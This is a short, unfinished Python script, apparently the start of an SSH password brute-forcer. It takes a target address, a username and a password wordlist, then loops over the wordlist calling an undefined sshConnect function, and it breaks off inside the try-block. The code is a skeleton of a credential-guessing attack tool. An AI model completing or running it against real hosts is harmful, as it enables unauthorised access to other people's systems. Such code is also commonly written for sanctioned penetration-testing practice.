import paramiko, sys, os, socket, termcolor

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
fileInput = input('[+] Passwords File: ')

if os.path.exists(fileInput) == False:
    print('Specified password file does not exist')
    sys.exit(1)

with open(fileInput, 'r') as file:
    
    for line in file.readlines():
        password = line.strip('\n')

        try: # TODO: implement sshConnect function
            sshConnect(password)